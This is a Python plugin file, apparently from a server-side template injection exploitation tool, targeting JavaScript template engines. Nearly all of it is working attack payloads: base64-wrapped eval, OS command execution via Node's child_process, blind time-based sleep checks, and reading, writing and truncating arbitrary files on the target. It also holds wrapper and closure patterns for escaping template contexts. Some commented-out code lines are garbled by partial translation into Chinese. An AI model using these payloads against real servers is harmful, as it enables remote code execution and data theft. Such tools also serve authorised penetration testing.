from plugins.languages import javascript
from utils import rand

# TODO：process.mainModule 可能未定义，需要替换
class Javascript_generic(javascript.Javascript):
    priority = 9
    plugin_info = {
        "Description": '标签中具有 JavaScript 语句评估的模板引擎',
        "Usage notes": '该插件可用于加速简单上下文中的检测以及覆盖更多此类引擎。',
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'header': """{header[0]}+{header[1]}""",
                'trailer': """{trailer[0]}+{trailer[1]}""",
                'render': '{code}',
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'render_error': {
                # 只需使用包装的载荷进行评估
                'wrapper_type': "global",
            },
            'evaluate': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
                'test_os': """global.process.mainModule.require('os').platform()"""
                # 'test_os': """进程.平台"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """eval(Buffer('{code_b64p}', 'base64').toString())&&global.process.mainModule.require('child_process').execSync('sleep {delay}')"""
            },
            'execute': {
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
                # '执行': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString()], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).输出[1]%>"""
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell 选项已在 Node 5.7 中引入，因此这不适用于旧的 Node 版本。
                # TODO：使用另一个函数。
                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            'execute_blind': {
                'execute_blind': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')"""
                # 'execute_blind': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString() + ' && 睡眠{delay}'], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
            },
            'write': {
                'write': """global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
                'truncate': """global.process.mainModule.require('fs').writeFileSync('{path}', '')"""
            },
            'read': {
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
            'md5_blind': {
                'call': 'evaluate_blind',
                'md5_blind': "global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
                'exists_blind': "global.process.mainModule.require('fs').existsSync('{path}')"
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0, 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}", "<%={code}%>",
                                      "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}", "\n={code}\n"]},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["{{{code}}}"], 'suffix': '{"1"',
             'closures': javascript.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{{code}}}}}"], 'suffix': '{{"1"',
             'closures': javascript.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["${{{code}}}"], 'suffix': '${"1"',
             'closures': javascript.ctx_closures},
            {'level': 2, 'prefix': '{closure}%>', 'wrappers': ["<%={code}%>"], 'suffix': '<%="1"',
             'closures': javascript.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["#{{{code}}}"], 'suffix': '#{"1"',
             'closures': javascript.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["{{={code}}}"], 'suffix': '{="1"',
             'closures': javascript.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{={code}}}}}"], 'suffix': '{{="1"',
             'closures': javascript.ctx_closures},
            {'level': 3, 'prefix': '{closure}\n', 'wrappers': ["\n={code}\n"], 'suffix': '\n="1"',
             'closures': javascript.ctx_closures},
            {'level': 3, 'prefix': '{closure}%}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}",
                                                                "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{%"1"',
             'closures': javascript.ctx_closures},
            # Comments
            {'level': 4, 'prefix': '*}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}",
                                                       "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}"],
             'suffix': '{*'},
            {'level': 4, 'prefix': '#}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}",
                                                       "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}"],
             'suffix': '{#'},
        ])
